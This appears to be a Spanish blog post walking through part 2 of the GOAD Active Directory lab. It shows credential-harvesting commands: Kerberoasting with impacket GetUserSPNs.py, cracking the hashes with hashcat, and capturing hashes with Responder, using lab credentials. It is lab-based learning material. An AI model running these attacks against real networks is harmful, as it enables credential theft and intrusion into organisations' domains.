---
layout: single
title: Game of Active Directory - Parte 2
excerpt: "En esta segunda parte veremos como seguir obteniendo credenciales con la vulnerabilidad *kerberoasting* y con el *responder*. Además utilizaré sliver c2 framework para obtener la intrusión inicial y elevar privilegios."
date: 2024-03-30
classes: wide
header:
  teaser: /assets/images/Goad/logo_GOAD.jpg
  teaser_home_page: true
categories:
  - Ciberseguridad
tags:
  - Windows
  - Active Directory
---

[](/assets/images/Goad/logo_GOAD.jpg)

En esta segunda parte veremos como seguir obteniendo credenciales con la vulnerabilidad *kerberoasting* y con el *responder*. Además utilizaré sliver c2 framework para obtener la intrusión inicial y elevar privilegios.


## Kerberoasting

Podemos utilizar impacket para intentar explotar esta vulnerabilidad, que se da cuando algún usuario del dominio tiene asociado un SPN. 

```bash
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```

![](/assets/images/Goad/kerberoasting.jpg)


Obtenemos 3 hashes que corresponden a los usuarios sansa.stark, jon.snow y sql_svc. Y ahora podemos intentar crackearlos con hashcat.

```bash
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```


![](/assets/images/Goad/hashcat_kerb.jpg)


Ya tenemos otra credencial: `jon.snow:iknownothing`


## Responder

Otra forma de obtener credenciales es utilizar el responder. En el laboratorio, hay dos bots para simular solicitudes LLMRN, MDNS y NBT-NS. Un usuario tiene una contraseña débil pero no tiene derechos de administrador. Otro usuario tiene derechos de administrador pero utiliza una contraseña segura.

```bash
Responder.py -I vboxnet0
```

Unos minutos después de ejecutar el comando obtenemos el hash de robb.stark, y casi enseguida el de eddard.stark.


![](/assets/images/Goad/responder.jpg)


![](/assets/images/Goad/responder2.jpg)


